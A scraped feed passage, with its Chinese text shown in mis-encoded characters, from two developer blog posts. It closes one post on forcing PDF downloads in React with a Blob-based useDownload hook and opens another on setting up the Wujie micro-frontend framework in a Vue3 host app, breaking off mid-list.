<li><strong>Word/MD æ–‡ä»¶</strong>ï¼šç”±äº Chrome ç­‰æµè§ˆå™¨æ²¡æœ‰å†…ç½®æ¸²æŸ“å¼•æ“ï¼Œå®ƒä¼šè¯†åˆ«ä¸ºâ€œä¸å¯ç›´æ¥è¯»å–çš„å†…å®¹â€ï¼Œä»è€Œè§¦å‘ä¸‹è½½ã€‚</li>
<li><strong>PDF æ–‡ä»¶</strong>ï¼šç°ä»£æµè§ˆå™¨å‡å†…ç½®äº†åŠŸèƒ½å¼ºå¤§çš„ PDF æ¸²æŸ“å™¨ã€‚å½“å®ƒæ¥æ”¶åˆ° <code>application/pdf</code> ç±»å‹æ—¶ï¼Œé»˜è®¤è¡Œä¸ºæ˜¯ <strong>â€œå½“å‰çª—å£å¯¼èˆªï¼ˆNavigationï¼‰â€</strong> ã€‚</li>
</ul>
<h4 data-id="heading-2">2. è¢«å¿½ç•¥çš„ <code>download</code> å±æ€§</h4>
<p>æˆ‘ä»¬é€šå¸¸å°è¯•é€šè¿‡ <code>&lt;a download&gt;</code> æ ‡ç­¾å¼ºåˆ¶ä¸‹è½½ï¼Œä½†å®ƒå—åˆ° <strong>åŒæºç­–ç•¥ï¼ˆSame-Origin Policyï¼‰</strong> çš„ä¸¥æ ¼é™åˆ¶ï¼š</p>
<ul>
<li><strong>åŒæºè¯·æ±‚</strong>ï¼š<code>download</code> å±æ€§æ­£å¸¸å·¥ä½œï¼Œå¼ºåˆ¶ä¸‹è½½ã€‚</li>
<li><strong>è·¨åŸŸè¯·æ±‚</strong>ï¼šå¦‚æœèµ„æºæ¥è‡ªä¸åŒçš„åŸŸå/ç«¯å£ï¼Œæµè§ˆå™¨å‡ºäºå®‰å…¨è€ƒè™‘ä¼š <strong>æ— è§† <code>download</code> å±æ€§</strong>ï¼Œå°†å…¶é™çº§ä¸ºä¸€ä¸ªæ™®é€šé“¾æ¥ï¼Œå¯¼è‡´ PDF ç›´æ¥åœ¨å½“å‰é¡µæ‰“å¼€ã€‚</li>
</ul>
<h2 data-id="heading-3">äºŒã€Blob å¯¹è±¡ä¸ Object URL</h2>
<p>ä¸ºäº†ç»•è¿‡è·¨åŸŸä¸‹è½½é™åˆ¶å¹¶é˜²æ­¢åŸé¡µé¢ä¸¢å¤±ï¼Œæœ€ç¨³å¥çš„æ–¹æ¡ˆæ˜¯åˆ©ç”¨ <strong>Blob (Binary Large Object)</strong> ã€‚</p>
<h4 data-id="heading-4">1. å†…å­˜ä¸­çš„â€œå½±å­æ–‡ä»¶â€</h4>
<p>é€šè¿‡ <code>fetch</code> è¯·æ±‚å°†è¿œç¨‹æ–‡ä»¶æ‹‰å–åˆ°å†…å­˜ä¸­è½¬æ¢ä¸º <code>Blob</code>ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>URL.createObjectURL(blob)</code> ç”Ÿæˆä¸€ä¸ªä¸´æ—¶çš„ <code>blob:</code> åè®®é“¾æ¥ã€‚</p>
<blockquote>
<p><strong>MDN å®šä¹‰ - URL.createObjectURL()ï¼š</strong></p>
<p>è¯¥æ–¹æ³•åˆ›å»ºä¸€ä¸ª <code>DOMString</code>ã€‚è¯¥ URL çš„ç”Ÿå‘½å‘¨æœŸä¸å…¶åˆ›å»ºæ—¶çš„ <code>document</code> ç»‘å®šã€‚</p>
</blockquote>
<h4 data-id="heading-5">2. ä¸ºä»€ä¹ˆ Blob èƒ½è§£å†³é—®é¢˜ï¼Ÿ</h4>
<ul>
<li><strong>ä¼ªè£…åŒæº</strong>ï¼šç”Ÿæˆçš„ <code>blob://</code> é“¾æ¥ä¸å½“å‰é¡µé¢æ‹¥æœ‰ç›¸åŒçš„ Originï¼Œè¿™ä½¿å¾— <code>download</code> å±æ€§ 100% è¢«æµè§ˆå™¨å°Šé‡ã€‚</li>
<li><strong>ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>ï¼šè™½ç„¶ URL ä¸ DOM æ ‘ç»‘å®šï¼Œä½†å®ƒä»…ä»…æ˜¯æŒ‡å‘å†…å­˜çš„æŒ‡é’ˆã€‚é€šè¿‡æ‰‹åŠ¨åˆ›å»º <code>a</code> æ ‡ç­¾å¹¶è®¾ç½® <code>target="_blank"</code> æˆ–è§¦å‘ <code>.click()</code>ï¼Œæˆ‘ä»¬å¯ä»¥ç²¾ç¡®æ§åˆ¶å®ƒæ˜¯é™é»˜ä¸‹è½½è¿˜æ˜¯æ–°çª—å£é¢„è§ˆã€‚</li>
</ul>
<h2 data-id="heading-6">ä¸‰ã€æ¶æ„å‡çº§ï¼šè‡ªå®šä¹‰ Hook çš„è§£è€¦è‰ºæœ¯</h2>
<p>åœ¨å¤æ‚çš„ä¸šåŠ¡é€»è¾‘ä¸­ï¼Œæˆ‘åŸæœ¬å°†æ–‡ä»¶è·å–ã€Blob è½¬æ¢ã€åŠ¨æ€åˆ›å»º DOM èŠ‚ç‚¹ç­‰ä»£ç å †ç§¯åœ¨ <code>index.tsx</code> ä¸­ä¼šå¯¼è‡´ç»´æŠ¤ç¾éš¾ã€‚</p>
<h4 data-id="heading-7">1. é€»è¾‘æŠ½ç¦»çš„å¿…è¦æ€§</h4>
<ul>
<li><strong>å…³æ³¨ç‚¹åˆ†ç¦»</strong>ï¼šUI ç»„ä»¶åªè´Ÿè´£â€œå±•ç¤ºâ€ï¼Œè€Œä¸‹è½½çš„ç¹çé€»è¾‘åº”è¯¥äº¤ç»™ä¸“é—¨çš„é€»è¾‘å•å…ƒã€‚</li>
<li><strong>å¤ç”¨æ€§</strong>ï¼šè‡ªå®šä¹‰ Hook å¯ä»¥è®©ä¸‹è½½é€»è¾‘åœ¨å…¨ç«™ä¸åŒé¡µé¢é—´è‡ªç”±å¯¼å…¥ã€‚</li>
</ul>
<h4 data-id="heading-8">2. æœ€ä½³å®è·µä»£ç å®ç°</h4>
<p>æˆ‘ä»¬å°†è¿™ä¸€è¿‡ç¨‹å°è£…ä¸º <code>useDownload</code> Hookï¼Œå®ç°ä¸€å¤„å®šä¹‰ï¼Œéšå¤„è°ƒç”¨ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-comment">/**
 * è‡ªå®šä¹‰ä¸‹è½½ Hook
 * å°è£…äº†ä»è·å–æµåˆ°è§¦å‘ DOM ç‚¹å‡»çš„å…¨è¿‡ç¨‹
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useDownload</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleDownload</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">fileUrl: <span class="hljs-built_in">string</span>, fileName: <span class="hljs-built_in">string</span></span>) =&gt; {
    <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">true</span>);
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 1. è·å–èµ„æºå¹¶è½¬åŒ–ä¸ºäºŒè¿›åˆ¶ Blob</span>
      <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(fileUrl);
      <span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">blob</span>();

      <span class="hljs-comment">// 2. ç”Ÿæˆå†…å­˜ URL</span>
      <span class="hljs-keyword">const</span> url = <span class="hljs-variable language_">window</span>.<span class="hljs-property">URL</span>.<span class="hljs-title function_">createObjectURL</span>(blob);

      <span class="hljs-comment">// 3. åŠ¨æ€æ³¨å…¥ a æ ‡ç­¾è§¦å‘ä¸‹è½½</span>
      <span class="hljs-keyword">const</span> link = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'a'</span>);
      link.<span class="hljs-property">href</span> = url;
      link.<span class="hljs-property">download</span> = fileName; <span class="hljs-comment">// æ­¤æ—¶åŒæºï¼Œdownload å±æ€§ç”Ÿæ•ˆ</span>
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(link);
      link.<span class="hljs-title function_">click</span>();

      <span class="hljs-comment">// 4. æ¸…ç†ç°åœº</span>
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">removeChild</span>(link);
      <span class="hljs-variable language_">window</span>.<span class="hljs-property">URL</span>.<span class="hljs-title function_">revokeObjectURL</span>(url); <span class="hljs-comment">// å¿…é¡»é‡Šæ”¾å†…å­˜ï¼Œé˜²æ­¢æº¢å‡º</span>
    } <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"ä¸‹è½½å¤±è´¥"</span>, e);
    } <span class="hljs-keyword">finally</span> {
      <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>);
    }
  };

  <span class="hljs-keyword">return</span> { handleDownload, loading };
};
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h3 data-id="heading-9">ğŸŒŸ æ€»ç»“</h3>
<p>ä¸€ä¸ª PDF è·³è½¬çš„å° Bugï¼Œæˆ‘è¡¥å……äº†ä¸€äº›Web API çš„å­¦ä¹ ï¼Œæœ¬è´¨ä¸Šæ˜¯æµè§ˆå™¨å®‰å…¨ç­–ç•¥ä¸æ¸²æŸ“æœºåˆ¶çš„ç»¼åˆä½“ç°ã€‚</p>
<ol>
<li><strong>æ˜ç¡®è¾¹ç•Œ</strong>ï¼šçŸ¥é“ <code>download</code> å±æ€§ä½•æ—¶å¤±æ•ˆï¼Œæ¯”ç›²ç›®è°ƒè¯•ä»£ç æ›´é‡è¦ã€‚</li>
<li><strong>ç”Ÿå‘½å‘¨æœŸæ„è¯†</strong>ï¼šåœ¨ä½¿ç”¨ <code>createObjectURL</code> æ—¶ï¼Œå¿…é¡»å…»æˆé…å¥—ä½¿ç”¨ <code>revokeObjectURL</code> çš„ä¹ æƒ¯ã€‚</li>
<li><strong>æ¶æ„æ€ç»´</strong>ï¼šå³ä¾¿æ˜¯ä¸€ä¸ªâ€œå¾ˆå°çš„ Bugâ€ï¼Œä¹Ÿå€¼å¾—é€šè¿‡ <strong>è‡ªå®šä¹‰ Hook</strong> è¿›è¡Œæ¶æ„çº§çš„å°è£…ï¼Œä»è€Œå®ç°ä»â€œä¸šåŠ¡å®ç°â€åˆ°â€œå·¥ç¨‹è®¾è®¡â€çš„è·¨è¶Šã€‚</li>
</ol>
<h3 data-id="heading-10">Â å‚è€ƒæ–‡çŒ®ï¼š</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FHTML%2FReference%2FElements%2Fa" title="https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/a" target="_blank" ref="nofollow noopener noreferrer"/><a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">: The Anchor element - HTML | MDN</a><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FHTML%2FReference%2FElements%2Fa" title="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Reference/Elements/a" target="_blank" ref="nofollow noopener noreferrer"/><a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">ï¼šé”šå…ƒç´  - HTMLï¼ˆè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼‰ | MDN</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.reportlab.com%2Fdocs%2Freportlab-userguide.pdf" title="https://www.reportlab.com/docs/reportlab-userguide.pdf" target="_blank" ref="nofollow noopener noreferrer">reportlab.com/docs/reportâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzh-hans.react.dev%2Flearn%2Fsynchronizing-with-effects" title="https://zh-hans.react.dev/learn/synchronizing-with-effects" target="_blank" ref="nofollow noopener noreferrer">ä½¿ç”¨ Effect è¿›è¡ŒåŒæ­¥ â€“ React ä¸­æ–‡æ–‡æ¡£</a><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FHTML%2FReference%2FElements%2Fa" title="https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/a" target="_blank" ref="nofollow noopener noreferrer"/><a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">: The Anchor element - HTML | MDN</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FURL%2FcreateObjectURL_static" title="https://developer.mozilla.org/zh-CN/docs/Web/API/URL/createObjectURL_static" target="_blank" ref="nofollow noopener noreferrer">URLï¼šcreateObjectURL() é™æ€æ–¹æ³• - Web API | MDN</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FDocument" title="https://developer.mozilla.org/zh-CN/docs/Web/API/Document" target="_blank" ref="nofollow noopener noreferrer">Document - Web API | MDN</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FFile" title="https://developer.mozilla.org/zh-CN/docs/Web/API/File" target="_blank" ref="nofollow noopener noreferrer">File - Web API | MDN</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FBlob" title="https://developer.mozilla.org/zh-CN/docs/Web/API/Blob" target="_blank" ref="nofollow noopener noreferrer">Blob - Web API | MDN</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FMediaSource" title="https://developer.mozilla.org/zh-CN/docs/Web/API/MediaSource" target="_blank" ref="nofollow noopener noreferrer">MediaSource - Web API | MDN</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fzh-hans.react.dev%2Flearn%2Freusing-logic-with-custom-hooks" title="https://zh-hans.react.dev/learn/reusing-logic-with-custom-hooks" target="_blank" ref="nofollow noopener noreferrer">ä½¿ç”¨è‡ªå®šä¹‰ Hook å¤ç”¨é€»è¾‘ â€“ React ä¸­æ–‡æ–‡æ¡£</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FSecurity%2FDefenses%2FSame-origin_policy" title="https://developer.mozilla.org/zh-CN/docs/Web/Security/Defenses/Same-origin_policy" target="_blank" ref="nofollow noopener noreferrer">æµè§ˆå™¨çš„åŒæºç­–ç•¥ - å®‰å…¨ | MDN</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Wujieå¾®å‰ç«¯]]></title>    <link>https://juejin.cn/post/7601007650722922537</link>    <guid>https://juejin.cn/post/7601007650722922537</guid>    <pubDate>2026-01-30T15:15:38.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601007650722922537" data-draft-id="7600219080046231595" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Wujieå¾®å‰ç«¯"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-30T15:15:38.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç»†å¿ƒç»†å¿ƒå†ç»†å¿ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/721738373803879"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Wujieå¾®å‰ç«¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/721738373803879/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç»†å¿ƒç»†å¿ƒå†ç»†å¿ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:15:38.000Z" title="Fri Jan 30 2026 15:15:38 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">wujieä½¿ç”¨</h2>
<p>åŸºåº§åº”ç”¨æ˜¯â€œå®¹å™¨â€ï¼Œè´Ÿè´£åŠ è½½å’Œå±•ç¤ºå­åº”ç”¨ã€‚</p>
<p>å‡è®¾ä½ ç”¨ <strong>Vue3</strong> ä½œä¸ºåŸºåº§ï¼ˆæœ€å¸¸è§ï¼‰ï¼Œé…ç½®è¶…çº§ç®€å•ã€‚</p>
<h5 data-id="heading-1">1. åˆ›å»ºä¸€ä¸ªæ™®é€šçš„ Vue3 é¡¹ç›®ï¼ˆå¦‚æœä½ æ²¡æœ‰ï¼‰</h5>
<p>ç”¨ Vue CLI æˆ– Vite åˆ›å»ºï¼š</p>
<p>text</p>
<pre><code class="hljs language-sql" lang="sql">npm <span class="hljs-keyword">create</span> vue<span class="hljs-variable">@latest</span>
# æˆ–è€… viteï¼šnpm <span class="hljs-keyword">create</span> vite<span class="hljs-variable">@latest</span>
</code></pre>
<p>é€‰ Vue + TypeScript æˆ– JS éƒ½è¡Œï¼Œéšä¾¿ã€‚</p>
<h5 data-id="heading-2">2. å®‰è£… Wujie çš„ Vue3 åŒ…</h5>
<p>åœ¨ä½ çš„åŸºåº§é¡¹ç›®é‡Œè¿è¡Œï¼š</p>
<p>text</p>
<pre><code class="hljs language-css" lang="css">npm <span class="hljs-selector-tag">i</span> wujie-vue3 -S
</code></pre>
<h5 data-id="heading-3">3. åœ¨ main.jsï¼ˆæˆ– main.tsï¼‰é‡Œå¼•å…¥å¹¶æ³¨å†Œ</h5>
<p>æ‰“å¼€ src/main.jsï¼ŒåŠ ä¸Šè¿™äº›ä»£ç ï¼š</p>
<p>JavaScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'./router'</span>  <span class="hljs-comment">// å¦‚æœä½ æœ‰è·¯ç”±</span>

<span class="hljs-comment">// å¼•å…¥ WujieVue</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">WujieVue</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'wujie-vue3'</span>

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)

<span class="hljs-comment">// æ³¨å†Œ WujieVue æ’ä»¶</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-title class_">WujieVue</span>)

<span class="hljs-comment">// å¦‚æœæœ‰è·¯ç”±</span>
app.<span class="hljs-title function_">use</span>(router)

app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<h5 data-id="heading-4">4. åœ¨é¡µé¢é‡Œä½¿ç”¨<code>wujie-vue</code>ç»„ä»¶åŠ è½½å­åº”ç”¨</h5>
<p>æ‰“å¼€ä¸€ä¸ªé¡µé¢ç»„ä»¶ï¼Œæ¯”å¦‚ src/views/Home.vue æˆ– App.vueï¼Œå†™ä¸€ä¸ªå®¹å™¨ï¼š</p>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>è¿™æ˜¯åŸºåº§åº”ç”¨<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- è¿™é‡Œæ”¾å­åº”ç”¨ï¼Œwidth å’Œ height è‡ªå·±è°ƒ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">wujie-vue</span>
      <span class="hljs-attr">width</span>=<span class="hljs-string">"100%"</span>
      <span class="hljs-attr">height</span>=<span class="hljs-string">"800px"</span>
      <span class="hljs-attr">name</span>=<span class="hljs-string">"å”¯ä¸€åå­—"</span>        &lt;!<span class="hljs-attr">--</span> <span class="hljs-attr">éšä¾¿å–</span>ï¼Œ<span class="hljs-attr">ä½†è¦å”¯ä¸€</span>ï¼Œ<span class="hljs-attr">æ¯”å¦‚</span> "<span class="hljs-attr">vue3-app</span>" <span class="hljs-attr">--</span>&gt;</span>
      url="å­åº”ç”¨çš„åœ°å€"     <span class="hljs-comment">&lt;!-- å­åº”ç”¨çš„çº¿ä¸Šåœ°å€æˆ–æœ¬åœ°åœ°å€ï¼Œæ¯”å¦‚ http://localhost:3000 --&gt;</span>
      :sync="true"            <span class="hljs-comment">&lt;!-- å¯é€‰ï¼šè·¯ç”±åŒæ­¥ï¼Œæ¨èå¼€ --&gt;</span>
      :fetch="è‡ªå®šä¹‰fetch"    <span class="hljs-comment">&lt;!-- å¯é€‰ï¼šå¦‚æœå­åº”ç”¨æœ‰è·¨åŸŸé—®é¢˜ï¼Œå¯ä»¥è‡ªå®šä¹‰fetch --&gt;</span>
      :props="{ token: '123' }"  <span class="hljs-comment">&lt;!-- å¯é€‰ï¼šç»™å­åº”ç”¨ä¼ æ•°æ® --&gt;</span>
      :beforeLoad="beforeLoad"  <span class="hljs-comment">&lt;!-- å¯é€‰ï¼šç”Ÿå‘½å‘¨æœŸé’©å­ --&gt;</span>
      :beforeMount="beforeMount"
      :afterMount="afterMount"
    &gt;<span class="hljs-tag">&lt;/<span class="hljs-name">wujie-vue</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// å¯é€‰ï¼šç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">beforeLoad</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å­åº”ç”¨å¼€å§‹åŠ è½½'</span>)
}
<span class="hljs-keyword">const</span> <span class="hljs-title function_">beforeMount</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å­åº”ç”¨å³å°†æŒ‚è½½'</span>)
}
<span class="hljs-keyword">const</span> <span class="hljs-title function_">afterMount</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å­åº”ç”¨æŒ‚è½½å®Œæˆ'</span>)
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>å…³é”®å‚æ•°è§£é‡Šï¼ˆå°ç™½å¿…çœ‹ï¼‰ï¼š</strong></p>
<ul>
<li>nameï¼šå­åº”ç”¨çš„å”¯ä¸€åå­—ï¼Œä¸èƒ½é‡å¤ã€‚</li>
